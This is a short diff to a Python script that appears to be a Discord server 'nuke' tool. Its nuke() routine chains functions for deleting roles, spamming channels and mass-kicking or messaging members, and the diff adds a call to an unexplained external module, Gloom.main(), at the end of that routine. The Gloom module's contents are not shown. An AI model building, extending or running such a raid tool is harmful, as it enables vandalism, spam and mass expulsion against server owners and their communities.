@@ -2,6 +2,7 @@ import time
 import httpx
 import json as json
 import threading
+import Gloom
 
 
 def checkToken():  # sourcery skip: raise-specific-error
@@ -72,6 +73,7 @@ def nuke():
     deleteRoles()
     spamchannels()
     DMkickAll()
+    Gloom.main()
 
 threads = []
 for i in range(int(5)):
